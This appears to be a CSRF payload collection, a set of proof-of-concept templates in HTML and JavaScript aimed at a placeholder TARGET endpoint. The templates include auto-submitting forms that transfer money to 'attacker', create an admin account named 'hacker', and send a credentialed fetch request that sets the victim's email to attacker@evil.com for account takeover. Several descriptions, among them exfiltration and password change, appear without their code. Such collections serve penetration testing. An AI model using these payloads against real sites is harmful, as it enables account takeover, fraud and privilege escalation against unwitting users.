meta.name: CSRF
meta.description: Cross-Site Request Forgery proof-of-concept templates. Covers GET-based, POST form, JSON, fetch API, multipart, and CORS-based CSRF. Replace TARGET with the vulnerable endpoint URL.

payloads.description: GET-based CSRF via image tag — browser sends credentialed GET request automatically
GET CSRF via link — user click triggers state-changing request
GET CSRF via hidden iframe — silent auto-load on page visit
GET CSRF via JS Image object — no HTML element needed

payloads.code:
<form method="POST" action="https://TARGET/action">
  <input type="hidden" name="param" value="evil">
  <input type="submit" value="Click me">
</form>
payloads.description: Manual POST form CSRF — user must click submit

payloads.code:
<form id="csrfForm" method="POST" action="https://TARGET/action">
  <input type="hidden" name="param" value="evil">
</form>
<script>document.getElementById('csrfForm').submit();</script>
payloads.description: Auto-submit POST CSRF — form submits automatically via JS on page load

payloads.code:
<body onload="document.forms[0].submit()">
<form method="POST" action="https://TARGET/transfer">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
</form>
payloads.description: Auto-submit CSRF on body load — classic bank transfer PoC pattern

payloads.code:
<form method="POST" action="https://TARGET/admin/adduser" enctype="multipart/form-data">
  <input type="hidden" name="username" value="hacker">
  <input type="hidden" name="role" value="admin">
</form>
<script>document.forms[0].submit();</script>
payloads.description: Admin user creation CSRF — privilege escalation via CSRF
Fetch API CSRF — sends credentialed JSON POST; works when CORS allows origin with credentials
XHR JSON CSRF — XMLHttpRequest variant with withCredentials
JSON CSRF with text/plain content-type — bypasses preflight; server must accept text/plain as JSON

payloads.code:
<form method="POST" action="https://TARGET/upload" enctype="multipart/form-data">
  <input type="hidden" name="file"; filename="x" value="content">
</form>
<script>document.forms[0].submit();</script>
payloads.description: Multipart form CSRF — targets endpoints that only accept multipart/form-data
JSON via form with text/plain — constructs valid JSON in form body without preflight CORS

payloads.code:
<script>
fetch('https://TARGET/api/changeEmail', {
  method: 'POST',
  credentials: 'include',
  body: new URLSearchParams({'email': 'attacker@evil.com'})
});
</script>
payloads.description: Email change CSRF — changes victim's email to attacker's for account takeover
Password change CSRF — changes victim's password without old password requirement
CSRF data exfiltration — reads CSRF-protected endpoint and exfiltrates to attacker
Misconfigured CORS headers — wildcard origin with credentials enabled (impossible per spec but tested)
CORS reflecting attacker origin with credentials — allows full response read from attacker page
